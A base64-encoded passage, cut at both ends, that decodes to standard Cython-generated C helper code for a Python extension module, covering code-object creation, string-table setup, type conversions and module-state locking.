2J5dGVzID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZShsaW5lX3RhYmxlLCBkZXNjci5saW5lX3RhYmxlX2xlbmd0aCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbGluZV90YWJsZV9ieXRlcykpIGdvdG8gZG9uZTtcbiAgICAgICAgUHlfc3NpemVfdCBjb2RlX2xlbiA9IChkZXNjci5saW5lX3RhYmxlX2xlbmd0aCAqIDIgKyA0KSAmIH4zO1xuICAgICAgICBjb2RlX2J5dGVzID0gUHlCeXRlc19Gcm9tU3RyaW5nQW5kU2l6ZShOVUxMLCBjb2RlX2xlbik7XG4gICAgICAgIGlmICh1bmxpa2VseSghY29kZV9ieXRlcykpIGdvdG8gZG9uZTtcbiAgICAgICAgY2hhciogY19jb2RlX2J5dGVzID0gUHlCeXRlc19Bc1N0cmluZyhjb2RlX2J5dGVzKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFjX2NvZGVfYnl0ZXMpKSBnb3RvIGRvbmU7XG4gICAgICAgIG1lbXNldChjX2NvZGVfYnl0ZXMsIDAsIChzaXplX3QpIGNvZGVfbGVuKTtcbiAgICB9XG4gICAgY29kZV9vYmogPSAoUHlPYmplY3QqKSBfX1B5eF9fUHlDb2RlX05ldyhcbiAgICAgICAgKGludCkgZGVzY3IuYXJnY291bnQsXG4gICAgICAgIChpbnQpIGRlc2NyLm51bV9wb3Nvbmx5X2FyZ3MsXG4gICAgICAgIChpbnQpIGRlc2NyLm51bV9rd29ubHlfYXJncyxcbiAgICAgICAgKGludCkgZGVzY3IubmxvY2FscyxcbiAgICAgICAgMCxcbiAgICAgICAgKGludCkgZGVzY3IuZmxhZ3MsXG4gICAgICAgIGNvZGVfYnl0ZXMgPyBjb2RlX2J5dGVzIDogX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfYnl0ZXMsXG4gICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLFxuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSxcbiAgICAgICAgdmFybmFtZXNfdHVwbGVfZGVkdXAsXG4gICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLFxuICAgICAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV90dXBsZSxcbiAgICAgICAgZmlsZW5hbWUsXG4gICAgICAgIGZ1bmNuYW1lLFxuICAgICAgICAoaW50KSBkZXNjci5maXJzdF9saW5lLFxuICAgICAgICAoX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA+PSAoMHgwMzBiMDAwMCkgJiYgbGluZV90YWJsZV9ieXRlcykgPyBsaW5lX3RhYmxlX2J5dGVzIDogX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfYnl0ZXNcbiAgICApO1xuZG9uZTpcbiAgICBQeV9YREVDUkVGKGNvZGVfYnl0ZXMpO1xuICAgIFB5X1hERUNSRUYobGluZV90YWJsZV9ieXRlcyk7XG4gICAgI2lmIENZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgUHlfWERFQ1JFRih2YXJuYW1lc190dXBsZV9kZWR1cCk7XG4gICAgI2VuZGlmXG4gICAgUHlfREVDUkVGKHZhcm5hbWVzX3R1cGxlKTtcbiAgICByZXR1cm4gY29kZV9vYmo7XG59XG5cblxuc3RhdGljIGludCBfX1B5eF9Jbml0U3RyaW5ncyhfX1B5eF9TdHJpbmdUYWJFbnRyeSBjb25zdCAqdCwgUHlPYmplY3QgKip0YXJnZXQsIGNvbnN0IGNoYXIqIGNvbnN0KiBlbmNvZGluZ19uYW1lcykge1xuICAgIHdoaWxlICh0LT5zKSB7XG4gICAgICAgIFB5T2JqZWN0ICpzdHI7XG4gICAgICAgIGlmICh0LT5pc191bmljb2RlKSB7XG4gICAgICAgICAgICBpZiAodC0+aW50ZXJuKSB7XG4gICAgICAgICAgICAgICAgc3RyID0gUHlVbmljb2RlX0ludGVybkZyb21TdHJpbmcodC0+cyk7XG4gICAgICAgICAgICB9IGVsc2UgaWYgKHQtPmVuY29kaW5nKSB7XG4gICAgICAgICAgICAgICAgc3RyID0gUHlVbmljb2RlX0RlY29kZSh0LT5zLCB0LT5uIC0gMSwgZW5jb2RpbmdfbmFtZXNbdC0+ZW5jb2RpbmddLCBOVUxMKTtcbiAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgc3RyID0gUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKHQtPnMsIHQtPm4gLSAxKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHN0ciA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUodC0+cywgdC0+biAtIDEpO1xuICAgICAgICB9XG4gICAgICAgIGlmICghc3RyKVxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICAqdGFyZ2V0ID0gc3RyO1xuICAgICAgICBpZiAoUHlPYmplY3RfSGFzaChzdHIpID09IC0xKVxuICAgICAgICAgICAgcmV0dXJuIC0xO1xuICAgICAgICArK3Q7XG4gICAgICAgICsrdGFyZ2V0O1xuICAgIH1cbiAgICByZXR1cm4gMDtcbn1cblxuI2luY2x1ZGUgPHN0cmluZy5oPlxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlfc3NpemVfdCBfX1B5eF9zc2l6ZV9zdHJsZW4oY29uc3QgY2hhciAqcykge1xuICAgIHNpemVfdCBsZW4gPSBzdHJsZW4ocyk7XG4gICAgaWYgKHVubGlrZWx5KGxlbiA+IChzaXplX3QpIFBZX1NTSVpFX1RfTUFYKSkge1xuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfT3ZlcmZsb3dFcnJvciwgImJ5dGUgc3RyaW5nIGlzIHRvbyBsb25nIik7XG4gICAgICAgIHJldHVybiAtMTtcbiAgICB9XG4gICAgcmV0dXJuIChQeV9zc2l6ZV90KSBsZW47XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmcoY29uc3QgY2hhciogY19zdHIpIHtcbiAgICBQeV9zc2l6ZV90IGxlbiA9IF9fUHl4X3NzaXplX3N0cmxlbihjX3N0cik7XG4gICAgaWYgKHVubGlrZWx5KGxlbiA8IDApKSByZXR1cm4gTlVMTDtcbiAgICByZXR1cm4gX19QeXhfUHlVbmljb2RlX0Zyb21TdHJpbmdBbmRTaXplKGNfc3RyLCBsZW4pO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5Qnl0ZUFycmF5X0Zyb21TdHJpbmcoY29uc3QgY2hhciogY19zdHIpIHtcbiAgICBQeV9zc2l6ZV90IGxlbiA9IF9fUHl4X3NzaXplX3N0cmxlbihjX3N0cik7XG4gICAgaWYgKHVubGlrZWx5KGxlbiA8IDApKSByZXR1cm4gTlVMTDtcbiAgICByZXR1cm4gUHlCeXRlQXJyYXlfRnJvbVN0cmluZ0FuZFNpemUoY19zdHIsIGxlbik7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZyhQeU9iamVjdCogbykge1xuICAgIFB5X3NzaXplX3QgaWdub3JlO1xuICAgIHJldHVybiBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZ0FuZFNpemUobywgJmlnbm9yZSk7XG59XG4jaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUkgfHwgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfVVRGOFxuc3RhdGljIENZVEhPTl9JTkxJTkUgY29uc3QgY2hhciogX19QeXhfUHlVbmljb2RlX0FzU3RyaW5nQW5kU2l6ZShQeU9iamVjdCogbywgUHlfc3NpemVfdCAqbGVuZ3RoKSB7XG4gICAgaWYgKHVubGlrZWx5KF9fUHl4X1B5VW5pY29kZV9SRUFEWShvKSA9PSAtMSkpIHJldHVybiBOVUxMO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICB7XG4gICAgICAgIGNvbnN0IGNoYXIqIHJlc3VsdDtcbiAgICAgICAgUHlfc3NpemVfdCB1bmljb2RlX2xlbmd0aDtcbiAgICAgICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIodW5pY29kZV9sZW5ndGgpOyAvLyBvbmx5IGZvciBfX1BZWF9ERUZBVUxUX1NUUklOR19FTkNPRElOR19JU19BU0NJSVxuICAgICAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDBcbiAgICAgICAgaWYgKHVubGlrZWx5KFB5QXJnX1BhcnNlKG8sICJzIyIsICZyZXN1bHQsIGxlbmd0aCkgPCAwKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgICNlbHNlXG4gICAgICAgIHJlc3VsdCA9IFB5VW5pY29kZV9Bc1VURjhBbmRTaXplKG8sIGxlbmd0aCk7XG4gICAgICAgICNlbmRpZlxuICAgICAgICAjaWYgX19QWVhfREVGQVVMVF9TVFJJTkdfRU5DT0RJTkdfSVNfQVNDSUlcbiAgICAgICAgdW5pY29kZV9sZW5ndGggPSBQeVVuaWNvZGVfR2V0TGVuZ3RoKG8pO1xuICAgICAgICBpZiAodW5saWtlbHkodW5pY29kZV9sZW5ndGggPCAwKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgIGlmICh1bmxpa2VseSh1bmljb2RlX2xlbmd0aCAhPSAqbGVuZ3RoKSkge1xuICAgICAgICAgICAgUHlVbmljb2RlX0FzQVNDSUlTdHJpbmcobyk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICAjZW5kaWZcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICB9XG4jZWxzZVxuI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJXG4gICAgaWYgKGxpa2VseShQeVVuaWNvZGVfSVNfQVNDSUkobykpKSB7XG4gICAgICAgICpsZW5ndGggPSBQeVVuaWNvZGVfR0VUX0xFTkdUSChvKTtcbiAgICAgICAgcmV0dXJuIFB5VW5pY29kZV9Bc1VURjgobyk7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgUHlVbmljb2RlX0FzQVNDSUlTdHJpbmcobyk7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiNlbHNlXG4gICAgcmV0dXJuIFB5VW5pY29kZV9Bc1VURjhBbmRTaXplKG8sIGxlbmd0aCk7XG4jZW5kaWZcbiNlbmRpZlxufVxuI2VuZGlmXG5zdGF0aWMgQ1lUSE9OX0lOTElORSBjb25zdCBjaGFyKiBfX1B5eF9QeU9iamVjdF9Bc1N0cmluZ0FuZFNpemUoUHlPYmplY3QqIG8sIFB5X3NzaXplX3QgKmxlbmd0aCkge1xuI2lmIF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX0FTQ0lJIHx8IF9fUFlYX0RFRkFVTFRfU1RSSU5HX0VOQ09ESU5HX0lTX1VURjhcbiAgICBpZiAoUHlVbmljb2RlX0NoZWNrKG8pKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9QeVVuaWNvZGVfQXNTdHJpbmdBbmRTaXplKG8sIGxlbmd0aCk7XG4gICAgfSBlbHNlXG4jZW5kaWZcbiAgICBpZiAoUHlCeXRlQXJyYXlfQ2hlY2sobykpIHtcbiNpZiAoQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgJiYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUykgfHwgKENZVEhPTl9DT01QSUxJTkdfSU5fUFlQWSAmJiAoZGVmaW5lZChQeUJ5dGVBcnJheV9BU19TVFJJTkcpICYmIGRlZmluZWQoUHlCeXRlQXJyYXlfR0VUX1NJWkUpKSlcbiAgICAgICAgKmxlbmd0aCA9IFB5Qnl0ZUFycmF5X0dFVF9TSVpFKG8pO1xuICAgICAgICByZXR1cm4gUHlCeXRlQXJyYXlfQVNfU1RSSU5HKG8pO1xuI2Vsc2VcbiAgICAgICAgKmxlbmd0aCA9IFB5Qnl0ZUFycmF5X1NpemUobyk7XG4gICAgICAgIGlmICgqbGVuZ3RoID09IC0xKSByZXR1cm4gTlVMTDtcbiAgICAgICAgcmV0dXJuIFB5Qnl0ZUFycmF5X0FzU3RyaW5nKG8pO1xuI2VuZGlmXG4gICAgfSBlbHNlXG4gICAge1xuICAgICAgICBjaGFyKiByZXN1bHQ7XG4gICAgICAgIGludCByID0gUHlCeXRlc19Bc1N0cmluZ0FuZFNpemUobywgJnJlc3VsdCwgbGVuZ3RoKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KHIgPCAwKSkge1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgICAgICB9XG4gICAgfVxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShQeU9iamVjdCogeCkge1xuICAgaW50IGlzX3RydWUgPSB4ID09IFB5X1RydWU7XG4gICBpZiAoaXNfdHJ1ZSB8ICh4ID09IFB5X0ZhbHNlKSB8ICh4ID09IFB5X05vbmUpKSByZXR1cm4gaXNfdHJ1ZTtcbiAgIGVsc2UgcmV0dXJuIFB5T2JqZWN0X0lzVHJ1ZSh4KTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeU9iamVjdF9Jc1RydWVBbmREZWNyZWYoUHlPYmplY3QqIHgpIHtcbiAgICBpbnQgcmV0dmFsO1xuICAgIGlmICh1bmxpa2VseSgheCkpIHJldHVybiAtMTtcbiAgICByZXR2YWwgPSBfX1B5eF9QeU9iamVjdF9Jc1RydWUoeCk7XG4gICAgUHlfREVDUkVGKHgpO1xuICAgIHJldHVybiByZXR2YWw7XG59XG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X1B5TnVtYmVyX0xvbmdXcm9uZ1Jlc3VsdFR5cGUoUHlPYmplY3QqIHJlc3VsdCkge1xuICAgIF9fUHl4X1R5cGVOYW1lIHJlc3VsdF90eXBlX25hbWUgPSBfX1B5eF9QeVR5cGVfR2V0RnVsbHlRdWFsaWZpZWROYW1lKFB5X1RZUEUocmVzdWx0KSk7XG4gICAgaWYgKFB5TG9uZ19DaGVjayhyZXN1bHQpKSB7XG4gICAgICAgIGlmIChQeUVycl9XYXJuRm9ybWF0KFB5RXhjX0RlcHJlY2F0aW9uV2FybmluZywgMSxcbiAgICAgICAgICAgICAgICAiX19pbnRfXyByZXR1cm5lZCBub24taW50ICh0eXBlICIgX19QeXhfRk1UX1RZUEVOQU1FICIpLiAgIlxuICAgICAgICAgICAgICAgICJUaGUgYWJpbGl0eSB0byByZXR1cm4gYW4gaW5zdGFuY2Ugb2YgYSBzdHJpY3Qgc3ViY2xhc3Mgb2YgaW50IGlzIGRlcHJlY2F0ZWQsICJcbiAgICAgICAgICAgICAgICAiYW5kIG1heSBiZSByZW1vdmVkIGluIGEgZnV0dXJlIHZlcnNpb24gb2YgUHl0aG9uLiIsXG4gICAgICAgICAgICAgICAgcmVzdWx0X3R5cGVfbmFtZSkpIHtcbiAgICAgICAgICAgIF9fUHl4X0RFQ1JFRl9UeXBlTmFtZShyZXN1bHRfdHlwZV9uYW1lKTtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihyZXN1bHQpO1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICAgICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHJlc3VsdF90eXBlX25hbWUpO1xuICAgICAgICByZXR1cm4gcmVzdWx0O1xuICAgIH1cbiAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAiX19pbnRfXyByZXR1cm5lZCBub24taW50ICh0eXBlICIgX19QeXhfRk1UX1RZUEVOQU1FICIpIixcbiAgICAgICAgICAgICAgICAgcmVzdWx0X3R5cGVfbmFtZSk7XG4gICAgX19QeXhfREVDUkVGX1R5cGVOYW1lKHJlc3VsdF90eXBlX25hbWUpO1xuICAgIFB5X0RFQ1JFRihyZXN1bHQpO1xuICAgIHJldHVybiBOVUxMO1xufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TnVtYmVyX0xvbmcoUHlPYmplY3QqIHgpIHtcbiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgUHlOdW1iZXJNZXRob2RzICptO1xuI2VuZGlmXG4gIFB5T2JqZWN0ICpyZXMgPSBOVUxMO1xuICBpZiAobGlrZWx5KFB5TG9uZ19DaGVjayh4KSkpXG4gICAgICByZXR1cm4gX19QeXhfTmV3UmVmKHgpO1xuI2lmIENZVEhPTl9VU0VfVFlQRV9TTE9UU1xuICBtID0gUHlfVFlQRSh4KS0+dHBfYXNfbnVtYmVyO1xuICBpZiAobGlrZWx5KG0gJiYgbS0+bmJfaW50KSkge1xuICAgICAgcmVzID0gbS0+bmJfaW50KHgpO1xuICB9XG4jZWxzZVxuICBpZiAoIVB5Qnl0ZXNfQ2hlY2tFeGFjdCh4KSAmJiAhUHlVbmljb2RlX0NoZWNrRXhhY3QoeCkpIHtcbiAgICAgIHJlcyA9IFB5TnVtYmVyX0xvbmcoeCk7XG4gIH1cbiNlbmRpZlxuICBpZiAobGlrZWx5KHJlcykpIHtcbiAgICAgIGlmICh1bmxpa2VseSghUHlMb25nX0NoZWNrRXhhY3QocmVzKSkpIHtcbiAgICAgICAgICByZXR1cm4gX19QeXhfUHlOdW1iZXJfTG9uZ1dyb25nUmVzdWx0VHlwZShyZXMpO1xuICAgICAgfVxuICB9XG4gIGVsc2UgaWYgKCFQeUVycl9PY2N1cnJlZCgpKSB7XG4gICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICJhbiBpbnRlZ2VyIGlzIHJlcXVpcmVkIik7XG4gIH1cbiAgcmV0dXJuIHJlcztcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X3NzaXplX3QgX19QeXhfUHlJbmRleF9Bc1NzaXplX3QoUHlPYmplY3QqIGIpIHtcbiAgUHlfc3NpemVfdCBpdmFsO1xuICBQeU9iamVjdCAqeDtcbiAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdChiKSkpIHtcbiAgICAjaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICAgaWYgKGxpa2VseShfX1B5eF9QeUxvbmdfSXNDb21wYWN0KGIpKSkge1xuICAgICAgICByZXR1cm4gX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZShiKTtcbiAgICB9IGVsc2Uge1xuICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoYik7XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IHNpemUgPSBfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudChiKTtcbiAgICAgIHN3aXRjaCAoc2l6ZSkge1xuICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICByZXR1cm4gKFB5X3NzaXplX3QpICgoKCgoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICBjYXNlIC0yOlxuICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICByZXR1cm4gLShQeV9zc2l6ZV90KSAoKCgoKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICB9XG4gICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgY2FzZSAzOlxuICAgICAgICAgICBpZiAoOCAqIHNpemVvZihQeV9zc2l6ZV90KSA+IDMgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICByZXR1cm4gKFB5X3NzaXplX3QpICgoKCgoKChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICB9XG4gICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgY2FzZSAtMzpcbiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiAzICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgcmV0dXJuIC0oUHlfc3NpemVfdCkgKCgoKCgoKHNpemVfdClkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgIH1cbiAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICBjYXNlIDQ6XG4gICAgICAgICAgIGlmICg4ICogc2l6ZW9mKFB5X3NzaXplX3QpID4gNCAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgIHJldHVybiAoUHlfc3NpemVfdCkgKCgoKCgoKCgoc2l6ZV90KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICB9XG4gICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgY2FzZSAtNDpcbiAgICAgICAgICAgaWYgKDggKiBzaXplb2YoUHlfc3NpemVfdCkgPiA0ICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgcmV0dXJuIC0oUHlfc3NpemVfdCkgKCgoKCgoKCgoc2l6ZV90KWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChzaXplX3QpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHNpemVfdClkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAoc2l6ZV90KWRpZ2l0c1swXSkpO1xuICAgICAgICAgICB9XG4gICAgICAgICAgIGJyZWFrO1xuICAgICAgfVxuICAgIH1cbiAgICAjZW5kaWZcbiAgICByZXR1cm4gUHlMb25nX0FzU3NpemVfdChiKTtcbiAgfVxuICB4ID0gUHlOdW1iZXJfSW5kZXgoYik7XG4gIGlmICgheCkgcmV0dXJuIC0xO1xuICBpdmFsID0gUHlMb25nX0FzU3NpemVfdCh4KTtcbiAgUHlfREVDUkVGKHgpO1xuICByZXR1cm4gaXZhbDtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5X2hhc2hfdCBfX1B5eF9QeUluZGV4X0FzSGFzaF90KFB5T2JqZWN0KiBvKSB7XG4gIGlmIChzaXplb2YoUHlfaGFzaF90KSA9PSBzaXplb2YoUHlfc3NpemVfdCkpIHtcbiAgICByZXR1cm4gKFB5X2hhc2hfdCkgX19QeXhfUHlJbmRleF9Bc1NzaXplX3Qobyk7XG4gIH0gZWxzZSB7XG4gICAgUHlfc3NpemVfdCBpdmFsO1xuICAgIFB5T2JqZWN0ICp4O1xuICAgIHggPSBQeU51bWJlcl9JbmRleChvKTtcbiAgICBpZiAoIXgpIHJldHVybiAtMTtcbiAgICBpdmFsID0gUHlMb25nX0FzTG9uZyh4KTtcbiAgICBQeV9ERUNSRUYoeCk7XG4gICAgcmV0dXJuIGl2YWw7XG4gIH1cbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9Pd25lZF9QeV9Ob25lKGludCBiKSB7XG4gICAgQ1lUSE9OX1VOVVNFRF9WQVIoYik7XG4gICAgcmV0dXJuIF9fUHl4X05ld1JlZihQeV9Ob25lKTtcbn1cbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICogX19QeXhfUHlCb29sX0Zyb21Mb25nKGxvbmcgYikge1xuICByZXR1cm4gYiA/IF9fUHl4X05ld1JlZihQeV9UcnVlKSA6IF9fUHl4X05ld1JlZihQeV9GYWxzZSk7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqIF9fUHl4X1B5TG9uZ19Gcm9tU2l6ZV90KHNpemVfdCBpdmFsKSB7XG4gICAgcmV0dXJuIFB5TG9uZ19Gcm9tU2l6ZV90KGl2YWwpO1xufVxuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TG9uZ19Db21wYWN0QXNMb25nKFB5T2JqZWN0ICp4LCBsb25nICpyZXR1cm5fdmFsdWUpIHtcbiAgICBpZiAodW5saWtlbHkoIV9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpKVxuICAgICAgICByZXR1cm4gMDtcbiAgICBQeV9zc2l6ZV90IHZhbHVlID0gX19QeXhfUHlMb25nX0NvbXBhY3RWYWx1ZSh4KTtcbiAgICBpZiAoKHNpemVvZihsb25nKSA8IHNpemVvZihQeV9zc2l6ZV90KSkgJiYgdW5saWtlbHkodmFsdWUgIT0gKGxvbmcpIHZhbHVlKSlcbiAgICAgICAgcmV0dXJuIDA7XG4gICAgKnJldHVybl92YWx1ZSA9IChsb25nKSB2YWx1ZTtcbiAgICByZXR1cm4gMTtcbn1cbiNlbmRpZlxuXG5cblxuI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVCAmJiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuI2lmbmRlZiBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuI2lmIChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJIHx8IFBZX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApXG4gICNkZWZpbmUgQ1lUSE9OX01PRFVMRV9TVEFURV9MT09LVVBfVEhSRUFEX1NBRkUgMVxuI2Vsc2VcbiAgI2RlZmluZSBDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRSAwXG4jZW5kaWZcbiNlbmRpZlxuI2lmIENZVEhPTl9NT0RVTEVfU1RBVEVfTE9PS1VQX1RIUkVBRF9TQUZFICYmICFDWVRIT05fQVRPTUlDU1xuI2Vycm9yICJNb2R1bGUgc3RhdGUgd2l0aCBQRVA0ODkgcmVxdWlyZXMgYXRvbWljcy4gQ3VycmVudGx5IHRoYXRcJ3Mgb25lIG9mXFxcbiBDMTEsIEMrKzExLCBnY2MgYXRvbWljIGludHJpbnNpY3Mgb3IgTVNWQyBhdG9taWMgaW50cmluc2ljcyJcbiNlbmRpZlxuI2lmICFDWVRIT05fTU9EVUxFX1NUQVRFX0xPT0tVUF9USFJFQURfU0FGRVxuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKClcbiNlbGlmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDBcbnN0YXRpYyBQeU11dGV4IF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4ID0gezB9O1xuI2RlZmluZSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9Mb2NrKCkgUHlNdXRleF9Mb2NrKCZfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgUHlNdXRleF9VbmxvY2soJl9fUHl4X01vZHVsZVN0YXRlTG9va3VwX211dGV4KVxuI2VsaWYgZGVmaW5lZChfX2NwbHVzcGx1cykgJiYgX19jcGx1c3BsdXMgPj0gMjAxMTAzTFxuI2luY2x1ZGUgPG11dGV4Plxuc3RhdGljIHN0ZDo6bXV0ZXggX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXg7XG4jZGVmaW5lIF9fUHl4X01vZHVsZVN0YXRlTG9va3VwX0xvY2soKSBfX1B5eF9Nb2R1bGVTdGF0ZUxvb2t1cF9tdXRleC5sb2NrKClcbiNkZWZpbmUgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfVW5sb2NrKCkgX19QeXhfTW9kdWxlU3RhdGVMb29rdXBfbXV0ZXgudW5sb2NrKClcbiNlbGlmIGRlZmluZWQoX19TVERDX1ZFUlNJT05fXykgJiYgKF9fU1REQ1